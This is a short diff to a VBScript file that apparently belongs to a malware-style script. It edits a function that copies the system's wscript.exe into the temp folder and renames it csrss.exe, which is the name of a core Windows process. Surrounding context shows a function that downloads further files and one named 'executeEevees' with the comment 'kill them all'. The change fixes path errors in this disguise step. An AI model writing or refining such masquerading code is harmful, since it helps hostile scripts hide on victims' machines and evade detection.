@@ -43,8 +43,8 @@ Function getFiles(strFileURL, strHDLocation) 'automate get any files that are ne
 End Function
 
 Function copyWscript() 'Copy the systems wscript into a temporary folder rename it csrss
-	CreateObject("WScript.Shell").run "cmd /c xcopy C:\Windows\System32\wscript.exe C:\%temp%"
-	CreateObject("WScript.Shell").run "cmd /c ren C:\%temp%\wscript.exe C:\%temp%\csrss.exe"
+	CreateObject("WScript.Shell").run "cmd /c xcopy C:\Windows\System32\wscript.exe %temp%"
+	CreateObject("WScript.Shell").run "cmd /c ren %temp%\wscript.exe C:\%temp%\csrss.exe"
 End Function
 
 Function executeEevees() 'no seriously kill them all
